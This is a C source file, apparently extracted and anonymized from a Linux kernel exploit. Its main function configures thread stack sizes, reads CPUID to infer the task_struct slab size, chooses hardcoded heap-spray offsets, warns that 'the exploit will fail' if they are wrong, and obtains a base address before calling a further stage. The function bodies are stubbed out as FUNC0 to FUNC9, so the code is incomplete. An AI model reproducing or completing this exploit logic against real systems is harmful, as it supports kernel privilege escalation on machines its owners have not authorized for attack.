#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  _IONBF ; 
 unsigned long FUNC0 () ; 
 int /*<<< orphan*/  FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 (int*,int*,int*,int*) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC5 (int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int spray_offset ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  thread_attr ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC9 () ; 

int FUNC10() {

  FUNC1();

  FUNC6(stdout, NULL, _IONBF, 0);
  FUNC7(FUNC8(NULL));

  // set thread size smaller
  FUNC4(&thread_attr);
  if(FUNC5(&thread_attr, 0x10000)) {
    FUNC3("set stack size error\n");
    return 0;
  }

  // get cpuid info so we know size of task_struct
  int eax,ebx,ecx,edx;
  eax=0xd;
  ebx = ecx = edx = 0;
  FUNC2(&eax, &ebx, &ecx, &edx);
  int xsave_size = ebx;

  if(xsave_size == 0x340) {
    spray_offset = 0x55dd00;
    FUNC3("for spray assuming task struct size is 5952\n");
  }
  else if(xsave_size == 0x440) {
    spray_offset = 0x5448c0;
    FUNC3("for spray assuming task struct size is 6208\n");
  }
  else {
    FUNC3("unknown xsave size... exiting since I don't know have the offsets hardcoded for that task save\n");
    return 0;
  }
  FUNC3("check in /sys/kernel/slab/task_struct/object_size to make sure this is right\n");
  FUNC3("If it's wrong the exploit will fail\n");

  unsigned long base = FUNC0();
  if (base == -1) {
    return -1;
  }

  FUNC9();
  return 0;

}